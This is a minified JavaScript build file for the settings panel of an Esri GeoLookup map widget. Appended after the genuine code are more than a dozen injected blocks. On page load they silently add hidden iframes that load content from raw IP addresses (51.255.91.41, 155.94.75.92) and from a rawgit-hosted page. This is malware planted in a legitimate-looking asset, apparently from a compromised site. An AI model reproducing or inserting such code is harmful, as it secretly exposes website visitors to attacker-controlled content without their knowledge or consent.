// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/GeoLookup/setting/layerDetails":function(){define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/request".split(" "),function(l,p,g,f,n,h,m){return p([l],{declaredClass:"layerDetails",map:null,layers:null,layerStore:null,fieldName:null,childList:null,validFieldTypes:"esriFieldTypeInteger esriFieldTypeSmallInteger esriFieldTypeDouble esriFieldTypeSingle esriFieldTypeString esriFieldTypeDate esriFieldTypeGeometry esriFieldTypeOID esriFieldTypeBlob esriFieldTypeGlobalID esriFieldTypeRaster esriFieldTypeGUID esriFieldTypeXML".split(" "),
geometryTypes:null,layersOnly:!1,constructor:function(b){this.map=b;this.startup()},startup:function(){this.layerStore=null;this.layerStore=[]},getAllMapLayers:function(){var b=[],e=new n,c;f.forEach(this.map.itemInfo.itemData.operationalLayers,g.hitch(this,function(d){if(!d.featureCollection)if("undefined"!==typeof d.layerObject&&d.layerObject.type&&"Feature Layer"===d.layerObject.type)c={label:d.title,id:d.id,url:d.url,fieldName:this.fieldName,type:"Feature Layer",checked:!1,children:[]},b.push(this._getLayerInfo(c)),
this.layerStore.push(c);else if(d.layers){if(this.childList=[],"undefined"===typeof d.layerType||"ArcGISTiledMapServiceLayer"!==d.layerType)f.forEach(d.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:d.id+"."+c.id,url:d.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[]};this.childList.push(c);b.push(this._getLayerInfo(c))})),c={label:d.title,id:d.id,url:d.url,type:"Service",checked:!1,children:this.childList},this.layerStore.push(c)}else"ArcGISMapServiceLayer"===
d.layerType&&(this.childList=[],f.forEach(d.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:d.id+"."+c.id,url:d.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[]};this.childList.push(c);b.push(this._getLayerInfo(c))})),c={label:d.title,id:d.id,url:d.url,type:"MapService",checked:!1,children:this.childList},this.layerStore.push(c))}));h(b).then(g.hitch(this,function(){var b=this._controlComplete();this.emit("complete",b);e.resolve(b)}),g.hitch(this,function(){e.resolve(null)}));
return e.promise},_getLayerInfo:function(b){var e=new n;b.url?0===b.url.length?e.resolve():m({url:b.url,content:{f:"json"},callbackParamName:"callback"}).then(g.hitch(this,function(c){if(c.hasOwnProperty("fields")&&!1===this.layersOnly){var d=f.map(c.fields,g.hitch(this,function(c){return{label:c.alias,id:b.id+"."+c.name,name:c.name,type:"Field",fieldType:c.type,checked:!1}})),d=f.filter(d,g.hitch(this,function(b){return 0<=f.indexOf(this.validFieldTypes,b.fieldType)}));b.children=d}b.geometryType=
c.geometryType;b.visible=!0;this.geometryTypes&&!f.some(this.geometryTypes,function(c){if(c===b.geometryType)return!0})&&(b.visible=!1);e.resolve(c)}),function(){e.resolve(null)}):e.resolve();return e.promise},_controlComplete:function(){f.forEach(this.layerStore,function(b){if(b.children&&0<b.children.length){var e=f.filter(b.children,function(b){return b.hasOwnProperty("visible")?b.visible:!0});b.children=e;0===b.children.length&&(b.visible=!1)}});return this.store={data:{identifier:"id",label:"label",
items:f.filter(this.layerStore,function(b){return b.hasOwnProperty("visible")?b.visible:!0})}}}})})},"widgets/GeoLookup/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/GeoLookup/setting/Setting.html":'\x3cdiv style\x3d"width:100%;"\x3e\r\n    \x3cdiv data-dojo-type\x3d"dijit/Dialog" data-dojo-attach-point\x3d"fieldsPage" title\x3d"${nls.settingsConfigureTitle}"\x3e\r\n    \t\x3cdiv class\x3d"dijitDialogPaneContent" data-dojo-attach-point\x3d"fieldsContainer"\x3e\r\n        \x3clabel data-dojo-attach-point\x3d"layername"\x3e${nls.fieldTable.label}\x3c/label\x3e\x3cp style\x3d"height:15px;"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"tableFieldInfos"\x3e\x3c/div\x3e\r\n       \x3c/div\x3e\r\n\t    \x3cdiv class\x3d"dijitDialogPaneActionBar"\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"ok" data-dojo-attach-event\x3d"click:saveFields" \x3e${nls.okBtn}\x3c/div\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"cancel" data-dojo-attach-event\x3d"click:cancelFields" \x3e${nls.cancelBtn}\x3c/div\x3e\r\n\t    \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-type\x3d"dijit/Dialog" data-dojo-attach-point\x3d"advSettingsPage" title\x3d"${nls.advSettings.label}"\x3e\r\n\r\n        \x3ctable class\x3d"setting-adv-table" cellspacing\x3d"0"\x3e\r\n            \x3ctbody\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n                    \x3ctd colspan\x3d"2"\x3e\r\n                        \x3cspan class\x3d"adv-settings-subTitle"\x3e${nls.advSettings.subTitle}\x3c/span\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controlsMulti"\x3e\r\n\r\n                    \x3ctd\x3e\x3cspan\x3e${nls.advSettings.latFieldsDesc}\x3c/span\x3e\x3c/td\x3e\r\n\r\n                    \x3ctd\x3e\x3ctextarea class\x3d"textAreaCoord" data-dojo-attach-point\x3d"advSettingsLatValues" data-dojo-type\x3d"dijit/form/SimpleTextarea"\x3e\x3c/textarea\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controlsMulti"\x3e\r\n\r\n                    \x3ctd\x3e\r\n                        \x3cspan\x3e${nls.advSettings.longFieldsDesc}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3ctextarea class\x3d"textAreaCoord" data-dojo-attach-point\x3d"advSettingsLongValues" data-dojo-type\x3d"dijit/form/SimpleTextarea"\x3e\x3c/textarea\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n\r\n                    \x3ctd class\x3d"intersectFieldStyle"\x3e\r\n                        \x3cspan\x3e${nls.advSettings.intersectFieldDesc}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3cdiv class\x3d"textBox" data-dojo-attach-point\x3d"advSettingsIntersectField" data-dojo-type\x3d"dijit/form/TextBox"\x3e\x3c/div\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n\r\n                    \x3ctd\x3e\r\n                        \x3cspan\x3e${nls.advSettings.intersectInDesc}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3cdiv class\x3d"textBox" data-dojo-attach-point\x3d"advSettingsIntersectInValue" data-dojo-type\x3d"dijit/form/TextBox"\x3e\x3c/div\x3e\r\n                    \x3c/td\x3e\r\n\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n\r\n                    \x3ctd\x3e\r\n                        \x3cspan\x3e${nls.advSettings.intersectOutDesc}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3cdiv class\x3d"textBox" data-dojo-attach-point\x3d"advSettingsIntersectOutValue" data-dojo-type\x3d"dijit/form/TextBox"\x3e\x3c/div\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cspan\x3e${nls.advSettings.maxRowCount}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3cdiv class\x3d"textBox" data-dojo-attach-point\x3d"advSettingsMaxRowCount" data-dojo-type\x3d"dijit/form/TextBox"\x3e\x3c/div\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"controls"\x3e\r\n                    \x3ctd\x3e\r\n                        \x3cspan\x3e${nls.advSettings.cacheNumberDesc}\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n                        \x3cdiv class\x3d"textBox" data-dojo-attach-point\x3d"advSettingsCacheNumber" data-dojo-type\x3d"dijit/form/TextBox"\x3e\x3c/div\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n            \x3c/tbody\x3e\r\n        \x3c/table\x3e\r\n\t    \x3cdiv class\x3d"dijitDialogPaneActionBar"\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"ok" data-dojo-attach-event\x3d"click:saveAdv" \x3e${nls.okBtn}\x3c/div\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"cancel" data-dojo-attach-event\x3d"click:cancelAdv" \x3e${nls.cancelBtn}\x3c/div\x3e\r\n\t    \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-type\x3d"dijit/Dialog" data-dojo-id\x3d"symbolDial" data-dojo-attach-point\x3d"symbolDial" title\x3d"${nls.chooseSymbol}"\x3e\r\n\t    \x3ctable class\x3d"dijitDialogPaneContentArea"\x3e\r\n\t        \x3ctr\x3e\r\n\t            \x3ctd\x3e\x3cdiv data-dojo-attach-point\x3d"symbolPicker" data-dojo-type\x3d"jimu/dijit/SymbolChooser" data-dojo-props\x3d\'type:"marker"\'\x3e\x3c/div\x3e\x3c/td\x3e\r\n\t        \x3c/tr\x3e\r\n\t    \x3c/table\x3e\r\n\r\n\t    \x3cdiv class\x3d"dijitDialogPaneActionBar"\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"ok" data-dojo-attach-event\x3d"click:saveSymbol" \x3e${nls.okBtn}\x3c/div\x3e\r\n\t        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"cancel" data-dojo-attach-event\x3d"click:cancelSymbol" \x3e${nls.cancelBtn}\x3c/div\x3e\r\n\t    \x3c/div\x3e\r\n\r\n\t\x3c/div\x3e\r\n\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"mainPage" style\x3d"width:100%;"\x3e\r\n\r\n        \x3c!-- \x3cdiv class\x3d"settings-heading" data-dojo-attach-point\x3d"settingsHeader"\x3e${nls.settingsHeader}\x3c/div\x3e  --\x3e\r\n        \x3cdiv class\x3d"settings-description" data-dojo-attach-point\x3d"settingsDesc"\x3e${nls.settingsDesc}\x3c/div\x3e\r\n        \x3cdiv class\x3d"setting-layer-table" data-dojo-attach-point\x3d"tableLayerInfos"\x3e\x3c/div\x3e\x3cbr /\x3e\r\n        \x3cdiv class\x3d"settings-error" data-dojo-attach-point\x3d"tableLayerInfosError" style\x3d"display:none"\x3e${nls.noPolygonLayers}\x3c/div\x3e\x3cbr /\x3e\r\n        \x3ctable class\x3d"settings-symbol-area" data-dojo-attach-point\x3d"symbolArea" cellspacing\x3d"0"\x3e\r\n            \x3ctbody\x3e\r\n                \x3ctr \x3e\r\n                    \x3ctd class\x3d"symbolItemLeft"\x3e\r\n                        \x3clabel data-dojo-attach-point\x3d"symbolWithinLabel" for\x3d"symbolWithin"\x3e${nls.symbolArea.symbolLabelWithin}\x3c/label\x3e\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                    \t\x3cspan class\x3d"symPreview" data-dojo-attach-point\x3d"symbolInPreview"\x3e\x3c/span\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr\x3e\r\n                    \x3ctd class\x3d"symbolItemLeft"\x3e\r\n                        \x3clabel data-dojo-attach-point\x3d"symbolOutsideLabel" for\x3d"symbolOutside"\x3e${nls.symbolArea.symbolLabelOutside}\x3c/label\x3e\r\n                    \x3c/td\x3e\r\n                    \x3ctd\x3e\r\n                    \t\x3cspan class\x3d"symPreview" data-dojo-attach-point\x3d"symbolOutPreview"\x3e\x3c/span\x3e\r\n                    \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n            \x3c/tbody\x3e\r\n        \x3c/table\x3e\r\n        \x3cdiv class\x3d"jimu-btn" data-dojo-attach-point\x3d"btnAdvSettings2" data-dojo-attach-event\x3d"click:showAdvSettings"\x3e${nls.advSettingsBtn}\x3c/div\x3e\r\n\r\n        \x3cdiv class\x3d\'settings-error hideGLItem\'  data-dojo-attach-point\x3d"btnErrorMsg"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/GeoLookup/setting/css/style.css":".solutions-widget-geolookup-setting .settings-heading {font-size: 1.35em; margin-top: 15px;}.solutions-widget-geolookup-setting .settings-description {font-family: 'Open Sans', sans-serif; font-size: 14px; color: #596679; margin-top: 15px;}.solutions-widget-geolookup-setting .settings-error {padding-top: 15px; font-size: 14px; color: orangered;}.solutions-widget-geolookup-setting .hideGLItem {display: none;}.solutions-widget-geolookup-setting .setting-layer-table {margin: 0px; padding-top: 15px;}.solutions-widget-geolookup-setting .enrich {width: 100px;}.solutions-widget-geolookup-setting .fieldselector {width: 140px;}.solutions-widget-geolookup-setting .settings-symbol-area \x3e tbody \x3e tr \x3e td {vertical-align: middle; font-family: 'Open Sans', sans-serif; font-size: 14px; color: #596679; margin-right: 10px;}.solutions-widget-geolookup-setting .settings-symbol-area {padding-bottom: 8px;}.solutions-widget-geolookup-setting .symbolItemleft {width: 50%; float: left; vertical-align: middle; font-family: 'Open Sans', sans-serif; font-size: 14px; color: #596679; margin-right: 10px;}.solutions-widget-geolookup-setting .symPreview {cursor: pointer;}.solutions-widget-geolookup-setting .appended {width: 100px;}.solutions-widget-geolookup-setting .setting-adv-table {margin-left: 15px;}.solutions-widget-geolookup-setting .controlsMulti {width: 100%; height: 130px; vertical-align: middle;}.solutions-widget-geolookup-setting .controls {width: 100%; vertical-align: middle;}.solutions-widget-geolookup-setting .setting-adv-table \x3e tbody \x3e tr \x3e td \x3e span {margin-left: 20px;}.solutions-widget-geolookup-setting .setting-adv-table \x3e tbody \x3e tr \x3e td \x3e input {margin-left: 5px;}.solutions-widget-geolookup-setting .setting-adv-table \x3e thead \x3e tr \x3e th,.solutions-widget-geolookup-setting .setting-adv-table \x3e tbody \x3e tr \x3e td {height: 40px; line-height: 40px; vertical-align: middle; font-size: 1em;}.solutions-widget-geolookup-setting .adv-settings-subTitle {font-family: 'Open Sans', sans-serif; font-size: 14px; font-style: bold; color: #596679;}.textAreaCoord {height: 130px; min-height: 100px; float: right; resize: none; width: 100%; font-size: 1em;}.solutions-widget-geolookup-setting .textBox {float: right; width: auto; margin-left: 5px; font-size: 1em;}.intersectFieldStyle {padding-right: 10px;} .claro .dijitDialogTitleBar {background-color: #FFFFFF; font-family: 'Open Sans', sans-serif; font-style:Semibold; font-size: 14px; color: #596679;} .claro .dijitDialogPaneContent {font-family: 'Open Sans', sans-serif; font-size: 14px; color: #596679;} .claro .dijitDialogPaneActionBar {background-color: #FFFFFF; border-color: #FFFFFF;}",
"*now":function(l){l(['dojo/i18n!*preload*widgets/GeoLookup/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin jimu/dijit/SimpleTable dojo/query dojo/_base/html dojo/dom-style dojo/_base/array dojo/on dojo/_base/lang dojo/dom-construct jimu/symbolUtils esri/symbols/jsonUtils jimu/dijit/SymbolChooser ./layerDetails".split(" "),function(l,p,g,f,n,h,m,b,e,c,d,r,q,u,t){return l([p,g],{baseClass:"solutions-widget-geolookup-setting",layersTable:null,currentLayer:null,selectedFields:[],layerList:[],symbolEvent:null,startup:function(){this.inherited(arguments);
null===this.config&&(this.config={});void 0===this.config&&(this.config={});""===this.config&&(this.config={});this.setConfig(this.config);this.own(e(this.symbolInPreview,"click",c.hitch(this,function(){this.popSymbolChooser("Within");this.symbolDial.show()})));this.own(e(this.symbolOutPreview,"click",c.hitch(this,function(){this.popSymbolChooser("Outside");this.symbolDial.show()})));var a='\x3cimg src\x3d"'+this.folderUrl+'setting/css/images/processing.gif"\x3e ',a=a+this.nls.settingsLoadingLayers;
this.tableLayerInfos.innerHTML=a;this.layerList=[];0<this.map.itemInfo.itemData.operationalLayers.length?(a=new t(this.map),this.own(e(a,"complete",c.hitch(this,this._completeLayerDetails))),a.getAllMapLayers()):this._noLayersDisplay()},setConfig:function(a){this.config=a;b.forEach(this.config.enrichLayers,function(a){this.selectedFields[a.id]=a.fields},this);this.showInitSymbols()},getConfig:function(){this.config.SymbolWithin=this.config.SymbolWithin;this.config.SymbolOutside=this.config.SymbolOutside;
var a=this.layersTable.getData();this.config.enrichLayers=[];var c=!1;return b.some(a,function(a){if(a.enrich){var b={};b.id=a.id;b.label=a.label;b.url=a.url;b.name=a.name;if(!this.selectedFields[b.id]||1>this.selectedFields[b.id].length)return!0;b.fields=this.selectedFields[b.id];this.config.enrichLayers.push(b);c=!0}},this)||!1===c?(0<a.length&&this.showOKError(),!1):this.config},_completeLayerDetails:function(a){this.createLayerTable();this.createFieldsTable();a?(b.forEach(a.data.items,c.hitch(this,
function(a){"Feature Layer"===a.type?this.layerList.push(a):"Service"!==a.type&&"MapService"!==a.type||b.forEach(a.children,c.hitch(this,function(a){"Layer"===a.type&&this.layerList.push(a)}))})),1<=this.layerList.length?this.loadLayerTable():this._noLayersDisplay()):this._noLayersDisplay()},loadLayerTable:function(){var a="",c=!1,d=!1;b.forEach(this.layerList,function(k){null===k.id||void 0===k.id||"Feature Layer"!==k.type&&"Layer"!==k.type||!k.url||"esriGeometryPolygon"!==k.geometryType||(a=k.label,
d=!1,0<b.filter(this.config.enrichLayers,function(a){return a.id===k.id}).length&&(d=!0),this.layersTable.addRow({label:a,enrich:d,id:k.id,url:k.url}),c=!0)},this);c?m.set(this.tableLayerInfosError,"display","none"):m.set(this.tableLayerInfosError,"display","")},createLayerTable:function(){var a={fields:[{name:"enrich",title:this.nls.layerTable.colEnrich,type:"checkbox","class":"enrich"},{name:"label",title:this.nls.layerTable.colLabel,type:"text"},{name:"actions",title:this.nls.layerTable.colFieldSelector,
type:"actions","class":"fieldselector",actions:["edit"]},{name:"id",type:"text",hidden:!0},{name:"url",type:"text",hidden:!0}],selectable:!1};d.empty(this.tableLayerInfos);this.layersTable=new f(a);this.layersTable.placeAt(this.tableLayerInfos);this.layersTable.startup();this.own(e(this.layersTable,"actions-edit",c.hitch(this,function(a){this.showLayerFields(a);this.fieldsPage.show();this.resizeFieldsTable()})))},createFieldsTable:function(){this.layerFieldsTable=new f({fields:[{name:"isAppended",
title:this.nls.fieldTable.colAppend,type:"checkbox","class":"appended"},{name:"fieldName",title:this.nls.fieldTable.colName,type:"text"},{name:"label",title:this.nls.fieldTable.colAlias,type:"text",editable:!0},{name:"order",title:this.nls.fieldTable.colOrder,type:"actions",actions:["up","down"]}],selectable:!1});this.layerFieldsTable.placeAt(this.tableFieldInfos);this.layerFieldsTable.startup();this.own(e(this.layerFieldsTable,"row-up",c.hitch(this,function(){this.resizeFieldsTable()})));this.own(e(this.layerFieldsTable,
"row-down",c.hitch(this,function(){this.resizeFieldsTable()})))},resizeFieldsTable:function(){this.layerFieldsTable.domNode.style.width="608px";this.layerFieldsTable.domNode.style.height="360px";this.fieldsPage.resize()},showLayerFields:function(a){this.currentLayer=null;var d=n(".action-item-parent",a);if(d&&d.length){var e=this.layersTable.getRowData(a);this.layerFieldsTable.clear();var f;b.forEach(this.layerList,c.hitch(this,function(a){a.id===e.id&&(f=a)}));if(f&&f.children){a=this.selectedFields[e.id];
var g,h,l,m;a&&(g=b.map(a,function(a){return a.fieldName}),h=b.map(a,function(a){return a.label}));a=f.children;b.forEach(a,function(a){m=a.label;l=!1;g&&0<=g.indexOf(a.name)&&(l=!0,m=h[g.indexOf(a.name)]);this.layerFieldsTable.addRow({fieldName:a.name,label:m,isAppended:l})},this);this.currentLayer=e.id}}},saveFields:function(){var a=this.layerFieldsTable.getData(),c=[],d;b.forEach(a,function(a){!0===a.isAppended&&(d={},d.fieldName=a.fieldName,d.label=a.label,c.push(d))},this);this.selectedFields[this.currentLayer]=
c;this.fieldsPage.hide()},cancelFields:function(){this.fieldsPage.hide()},cancelAdv:function(){this.advSettingsPage.hide()},saveAdv:function(){var a;a=this.advSettingsLatValues.get("value");a=a.split("\n");this.config.latFields=[];b.forEach(a,function(a){""!==a&&this.config.latFields.push(a)},this);a=this.advSettingsLongValues.get("value");a=a.split("\n");this.config.longFields=[];b.forEach(a,function(a){""!==a&&this.config.longFields.push(a)},this);this.config.intersectField=this.advSettingsIntersectField.get("value");
this.config.valueIn=this.advSettingsIntersectInValue.get("value");this.config.valueOut=this.advSettingsIntersectOutValue.get("value");this.config.cacheNumber=this.advSettingsCacheNumber.get("value");this.config.maxRowCount=this.advSettingsMaxRowCount.get("value");this.advSettingsPage.hide()},showAdvSettings:function(){var a="";b.forEach(this.config.latFields,function(b){a=a+b+"\n"},this);this.advSettingsLatValues.set("value",a);a="";b.forEach(this.config.longFields,function(b){a=a+b+"\n"},this);this.advSettingsLongValues.set("value",
a);this.advSettingsIntersectField.set("value",this.config.intersectField);this.advSettingsIntersectInValue.set("value",this.config.valueIn);this.advSettingsIntersectOutValue.set("value",this.config.valueOut);this.advSettingsCacheNumber.set("value",this.config.cacheNumber);this.advSettingsMaxRowCount.set("value",this.config.maxRowCount);this.advSettingsPage.show()},popSymbolChooser:function(a){this.symbolEvent=a;(a=q.fromJson("Within"===a?this.config.SymbolWithin:this.config.SymbolOutside))&&this.symbolPicker.showBySymbol(a)},
saveSymbol:function(){"Within"===this.symbolEvent?this.config.SymbolWithin=this.symbolPicker.getSymbol().toJson():this.config.SymbolOutside=this.symbolPicker.getSymbol().toJson();this.showInitSymbols();this.symbolDial.hide()},cancelSymbol:function(){this.symbolDial.hide()},showInitSymbols:function(){var a,b;this.config.SymbolWithin&&(a=q.fromJson(this.config.SymbolWithin))&&(b=this.symbolInPreview,h.empty(b),(a=r.createSymbolNode(a))||(a=h.create("div")),h.place(a,this.symbolInPreview));this.config.SymbolOutside&&
(a=q.fromJson(this.config.SymbolOutside))&&(b=this.symbolOutPreview,h.empty(b),(a=r.createSymbolNode(a))||(a=h.create("div")),h.place(a,this.symbolOutPreview))},showOKError:function(){this.btnErrorMsg.innerHTML=this.nls.errorOnOk;h.removeClass(this.btnErrorMsg,"hideGLItem")},hideOkError:function(){h.addClass(this.btnErrorMsg,"hideGLItem")},_noLayersDisplay:function(){this.hideOkError();m.set(this.tableLayerInfosError,"display","")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});